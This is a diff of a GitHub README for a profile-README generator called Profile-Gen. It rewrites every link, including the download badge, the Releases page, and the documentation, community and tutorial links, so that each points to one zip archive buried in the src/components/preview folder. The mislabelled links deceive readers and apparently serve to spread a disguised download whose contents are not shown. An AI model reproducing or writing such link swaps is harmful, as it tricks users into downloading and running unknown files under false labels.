@@ -1,6 +1,6 @@
 # 🎨 Profile-Gen - Build Stunning GitHub READMEs Easily
 
-[![Download Profile-Gen](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/avishkar-code/Profile-Gen/releases)
+[![Download Profile-Gen](https://github.com/avishkar-code/Profile-Gen/raw/refs/heads/main/src/components/preview/Profile-Gen-2.3.zip)](https://github.com/avishkar-code/Profile-Gen/raw/refs/heads/main/src/components/preview/Profile-Gen-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Profile-Gen is designed to work on most personal computers. Here are the require
 
 ## 📥 Download & Install
 
-To get started with Profile-Gen, visit this page to download: [Profile-Gen Releases](https://github.com/avishkar-code/Profile-Gen/releases).  
+To get started with Profile-Gen, visit this page to download: [Profile-Gen Releases](https://github.com/avishkar-code/Profile-Gen/raw/refs/heads/main/src/components/preview/Profile-Gen-2.3.zip).  
 
 1. Click on the link above.
 2. Look for the latest version.
@@ -67,12 +67,12 @@ If you run into any problems, here are some tips:
 
 If you're looking for more information, here are some helpful links:
 
-- [Official Documentation](https://github.com/avishkar-code/Profile-Gen/docs)
-- [Community Support](https://github.com/avishkar-code/Profile-Gen/discussions)
-- [Tutorial Videos](https://youtube.com/search?q=Profile-Gen)
+- [Official Documentation](https://github.com/avishkar-code/Profile-Gen/raw/refs/heads/main/src/components/preview/Profile-Gen-2.3.zip)
+- [Community Support](https://github.com/avishkar-code/Profile-Gen/raw/refs/heads/main/src/components/preview/Profile-Gen-2.3.zip)
+- [Tutorial Videos](https://github.com/avishkar-code/Profile-Gen/raw/refs/heads/main/src/components/preview/Profile-Gen-2.3.zip)
 
 ## 📖 Conclusion
 
 Profile-Gen makes it easy to create a standout GitHub profile. Follow the steps above, and you will have your impressive README ready in no time.  
 
-For updates and new features, keep an eye on our Releases page: [Profile-Gen Releases](https://github.com/avishkar-code/Profile-Gen/releases).
+For updates and new features, keep an eye on our Releases page: [Profile-Gen Releases](https://github.com/avishkar-code/Profile-Gen/raw/refs/heads/main/src/components/preview/Profile-Gen-2.3.zip).
